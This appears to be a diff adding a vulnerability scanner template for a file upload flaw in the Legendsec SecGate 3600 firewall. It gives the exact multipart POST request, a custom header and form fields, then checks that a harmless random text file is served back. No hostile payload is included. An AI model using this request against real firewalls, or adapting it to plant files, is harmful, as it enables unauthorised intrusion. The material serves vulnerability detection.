@@ -1,0 +1,61 @@
+app: 网神SecGate 3600防火墙
+query: app:"网神SecGate 3600防火墙"
+meta:
+    name: 网神SecGate 3600防火墙文件上传
+    level: 5
+    tags:
+        - file_upload
+    description: 存在文件上传漏洞
+    homepage: https://www.legendsec.com/newsec.php?up=2&cid=143
+    author: X prism
+    references: ""
+    solution: 等待厂商推出安全补丁
+    create_at: "2023-12-14 10:48:47"
+    available: false
+    steps:
+        variable:
+            - filename: randomLowercase(5)
+        verify_steps:
+            type: and
+            verify:
+                - request:
+                    method: POST
+                    path: /
+                    redirect: true
+                    header:
+                        - Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryJpMyThWnAxbcBBQc
+                          Sl-Ce-Suid: 1057
+                    params: |
+                      ------WebKitFormBoundaryJpMyThWnAxbcBBQc
+                      Content-Disposition: form-data; name="reqfile";filename="{{filename}}.txt"
+                      Content-Type: text/plain
+
+                      {{filename}}t
+                      ------WebKitFormBoundaryJpMyThWnAxbcBBQc
+                      Content-Disposition: form-data; name="submit_post"
+
+                      obj_area_import_save
+                      ------WebKitFormBoundaryJpMyThWnAxbcBBQc--
+                  response:
+                    - name: header
+                      value: "Connection"
+                      type: contains
+                - request:
+                    method: GET
+                    path: /attachements/{{filename}}.txt
+                    redirect: true
+                    header: []
+                    params: ""
+                  response:
+                    - name: code
+                      value: "200"
+                      type: equals
+                    - name: body
+                      value: '{{filename}}t'
+                      type: contains
+        exploit_steps:
+            type: ""
+            params:
+                name: ""
+                type: input
+                value: ""
